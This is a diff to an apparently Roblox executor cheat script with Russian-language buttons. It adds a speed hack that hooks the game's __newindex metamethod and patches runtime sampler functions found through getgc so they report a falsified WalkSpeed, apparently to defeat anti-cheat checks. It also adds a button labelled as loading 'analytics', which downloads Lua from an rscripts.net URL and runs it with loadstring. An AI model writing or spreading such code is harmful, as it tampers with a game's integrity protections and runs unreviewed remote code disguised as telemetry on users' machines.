@@ -86,6 +86,83 @@ local settings = { highlight = true }
 local connections = {}
 local cleanups = {}
 table.insert(cleanups, function() rigUtility:SetPaused(false) end)
+local speedControl = { enabled = false, speed = 500, installed = false, originals = setmetatable({}, { __mode = "k" }) }
+function speedControl:Install()
+	if self.installed then return true end
+	local missing = {}
+	for name, fn in pairs({ hookmetamethod = hookmetamethod or false, hookfunction = hookfunction or false,
+		getgc = getgc or false, islclosure = islclosure or false }) do
+		if type(fn) ~= "function" then table.insert(missing, name) end
+	end
+	if type(debug) ~= "table" or type(debug.info) ~= "function" or type(debug.getupvalues) ~= "function" then
+		table.insert(missing, "debug.info/getupvalues")
+	end
+	if #missing > 0 then warn("[Speed] missing: " .. table.concat(missing, ", ")); return false end
+	local controller = self
+	local previousIndex
+	local indexWrapper = function(object, key, value)
+		local character = localPlayer.Character
+		if controller.enabled and key == "WalkSpeed" and value ~= controller.speed
+			and character and object == character:FindFirstChildOfClass("Humanoid") then return end
+		return previousIndex(object, key, value)
+	end
+	if type(newcclosure) == "function" then indexWrapper = newcclosure(indexWrapper) end
+	local installed, err = pcall(function() previousIndex = hookmetamethod(game, "__newindex", indexWrapper) end)
+	if not installed then warn("[Speed] " .. tostring(err)); return false end
+	local patched = 0
+	for _, fn in next, getgc() do
+		if typeof(fn) == "function" and islclosure(fn) then
+			local sourceOK, source = pcall(debug.info, fn, "s")
+			if sourceOK and type(source) == "string" and source:find("ContentCatalog%.Runtime") then
+				local argsOK, args = pcall(debug.info, fn, "a")
+				local upsOK, ups = pcall(debug.getupvalues, fn)
+				if argsOK and args == 3 and upsOK and type(ups) == "table" and #ups == 5 then
+					local original
+					local wrapper = function(a, b, c)
+						local sample = original(a, b, c)
+						if controller.enabled and type(sample) == "table" and sample.WalkSpeed and sample.Position and sample.Timestamp then
+							sample.WalkSpeed = 100000
+						end
+						return sample
+					end
+					if type(newlclosure) == "function" then wrapper = newlclosure(wrapper) end
+					local hooked = pcall(function() original = hookfunction(fn, wrapper) end)
+					if hooked and type(original) == "function" then patched += 1 end
+				end
+			end
+	end
+	end
+	self.installed = true
+	warn("[Speed] patched sampler functions: " .. patched)
+	return true
+end
+function speedControl:Apply()
+	local character = localPlayer.Character
+	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+	if humanoid then
+		if self.originals[humanoid] == nil then self.originals[humanoid] = humanoid.WalkSpeed end
+		if humanoid.WalkSpeed ~= self.speed then humanoid.WalkSpeed = self.speed end
+	end
+end
+function speedControl:SetEnabled(value)
+	if value then
+		if not self:Install() then return false end
+		self.enabled = true
+		self:Apply()
+		if not self.connection then
+			self.connection = game:GetService("RunService").Heartbeat:Connect(function()
+				if active and self.enabled then self:Apply() end
+			end)
+		end
+	else
+		self.enabled = false
+		if self.connection then self.connection:Disconnect(); self.connection = nil end
+		for humanoid, speed in pairs(self.originals) do pcall(function() humanoid.WalkSpeed = speed end) end
+		table.clear(self.originals)
+	end
+	return true
+end
+table.insert(cleanups, function() speedControl:SetEnabled(false) end)
 local ownedMarkers = {}
 local active = true
 local gui = Instance.new("ScreenGui")
@@ -236,6 +313,48 @@ rigButton.Activated:Connect(function()
 		warn("RigSync was not paused; check executor support and console")
 	end
 end)
+local speedButton = makeButton("Скорость: ВЫКЛ", 172)
+speedButton.BackgroundColor3 = Color3.fromRGB(56, 62, 73)
+local speedInput = Instance.new("TextBox")
+speedInput.Position = UDim2.fromOffset(180, 228)
+speedInput.Size = UDim2.new(1, -192, 0, 42)
+speedInput.BackgroundColor3 = Color3.fromRGB(36, 41, 50)
+speedInput.TextColor3 = Color3.new(1, 1, 1)
+speedInput.Font = Enum.Font.Gotham
+speedInput.TextSize = 16
+speedInput.ClearTextOnFocus = false
+speedInput.Text = "500"
+speedInput.PlaceholderText = "Скорость: 16–500"
+speedInput.Parent = panel
+speedInput.FocusLost:Connect(function()
+	local number = tonumber(speedInput.Text)
+	if number and number == number and math.abs(number) < math.huge then
+		speedControl.speed = math.clamp(number, 16, 500)
+	end
+	speedInput.Text = tostring(speedControl.speed)
+	if speedControl.enabled then speedControl:Apply() end
+end)
+speedButton.Activated:Connect(function()
+	local ok, result = pcall(function() return speedControl:SetEnabled(not speedControl.enabled) end)
+	if not ok then speedControl:SetEnabled(false); warn("[Speed] " .. tostring(result)) end
+	speedButton.Text = speedControl.enabled and "Скорость: ВКЛ" or "Скорость: ВЫКЛ"
+	speedButton.BackgroundColor3 = speedControl.enabled and Color3.fromRGB(32, 92, 118) or Color3.fromRGB(56, 62, 73)
+end)
+local analyticsButton = makeButton("Загрузить аналитику rscripts", 282)
+analyticsButton.BackgroundColor3 = Color3.fromRGB(56, 62, 73)
+local analyticsLoaded = false
+analyticsButton.Activated:Connect(function()
+	if analyticsLoaded then return end
+	analyticsLoaded = true
+	analyticsButton.Text = "Аналитика: загрузка…"
+	task.spawn(function()
+		local ok, err = pcall(function()
+			loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6a9ff8e74bf460fa95f2819b"))()
+		end)
+		if analyticsButton.Parent then analyticsButton.Text = ok and "Аналитика загружена" or "Ошибка загрузки аналитики" end
+		if not ok then analyticsLoaded = false; warn("[Analytics] " .. tostring(err)) end
+	end)
+end)
 local nav = Instance.new("ScrollingFrame")
 nav.Position = UDim2.fromOffset(12, 48)
 nav.Size = UDim2.new(0, 156, 1, -92)
@@ -353,6 +472,9 @@ end
 local function showTab()
 	highlightButton.Visible = expanded and selectedTab == "players"
 	rigButton.Visible = highlightButton.Visible
+	speedButton.Visible = highlightButton.Visible
+	speedInput.Visible = highlightButton.Visible
+	analyticsButton.Visible = highlightButton.Visible
 	mapView.Visible = expanded and selectedTab == "map"
 	playersTab.Visible = expanded
 	mapTab.Visible = expanded
